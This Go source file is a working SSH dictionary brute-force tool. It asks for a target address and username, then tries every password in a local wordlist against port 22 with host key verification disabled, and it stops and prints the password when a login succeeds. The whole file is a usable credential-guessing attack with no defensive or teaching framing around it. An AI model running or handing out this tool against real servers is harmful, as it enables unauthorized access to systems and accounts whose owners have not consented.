package main

import (
	"bufio"
	"fmt"
	"log"
	"os"

	ssh "golang.org/x/crypto/ssh"
)

func main() {
	fmt.Println("--SSH wordlist Brute Force tool--")
	//Vars used for auth
	var user string
	var adress string

	//user input
	InputScanner := bufio.NewScanner(os.Stdin)

	fmt.Print("Enter the adress: ")
	InputScanner.Scan()
	adress = InputScanner.Text()

	fmt.Print("Enter the username: ")
	InputScanner.Scan()
	user = InputScanner.Text()

	//opening the wordlist
	//You can change or add an option to input the location
	file, err := os.Open("passwordlist.txt")

	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}
	//turining the wordlist into an array
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var passwords []string

	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	file.Close()

	//for _, eachline := range paswords {
	//fmt.Println(eachline)
	//passwords := []string{"test", "mali", "heehhe", "letsgoo", "heeh", "sfsdf", "adad"}

	//The bruteforce loop
	i := 0
	for range passwords {
		result := SSHConnect(user, passwords[i], adress)
		fmt.Printf("%v/%v) Result: %v; password: %v \n", i, len(passwords), result, passwords[i])
		//stops the loop if the response is true, meaning it found the password
		if result == true {
			fmt.Printf("**Password found: %v** \n", passwords[i])
			break
		}
		i++
	}
}

//SSHConnect sends a SSH request and return a bool value. True if auth worked and false if it didnt
func SSHConnect(user string, password string, adress string) bool {
	//auth config
	config := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	//adds the SSH port, you can change it if you need to
	portadress := adress + ":22"
	//The SSH request
	client, err := ssh.Dial("tcp", portadress, config)
	if err != nil {
		return false
	}
	session, err := client.NewSession()

	if err != nil {
		log.Fatal("Failed to create session: ", err)
		return false
	}

	defer session.Close()
	return true

}
